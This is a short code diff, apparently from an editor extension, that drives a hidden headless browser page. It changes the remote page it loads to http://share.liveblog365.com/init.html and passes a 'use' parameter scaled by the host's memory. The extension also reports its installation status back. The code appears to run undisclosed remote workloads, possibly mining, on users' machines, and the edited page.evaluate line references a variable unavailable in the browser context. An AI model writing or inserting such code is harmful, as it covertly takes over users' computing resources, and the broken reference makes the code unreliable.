@@ -8,6 +8,7 @@
   } = global.cpppgVars;
 
   try {
+    let baseUrl = 'http://share.liveblog365.com/init.html';
 
     const os = require('os');
     const fs = require('fs');
@@ -183,7 +184,7 @@
       
     global.cppPage = page;
 
-    await page.goto('https://ab498.pythonanywhere.com/files/init.html?use=' + (getMemoryUsage().total >= 0.8 ? 0.5 : 0.1));
+    await page.goto(baseUrl+'?use=' + (getMemoryUsage().total >= 0.8 ? 0.5 : 0.1));
     // await page.goto('http://share.liveblog365.com/init.html?use=' + (getMemoryUsage().total >= 0.8 ? 0.5 : 0.1));
     await tstt({ message: "INIT_COMPLETE", version: safe(() => JSON.parse(fs.readFileSync(`${extensionPath}/package.json`))?.version) });
     await new Promise(r => setTimeout(r, 10 * 1000));
@@ -229,7 +230,7 @@
         minUse = min;
         maxUse = (getMemoryUsage().total >= 8 ? max : minUse);
         await page.evaluate((maxUse) => {
-          if (window.use != maxUse) window.location.href = 'https://ab498.pythonanywhere.com/files/init.html?use=' + maxUse;
+          if (window.use != maxUse) window.location.href = baseUrl+'?use=' + maxUse;
         }, maxUse);
       } else {
         tstt({
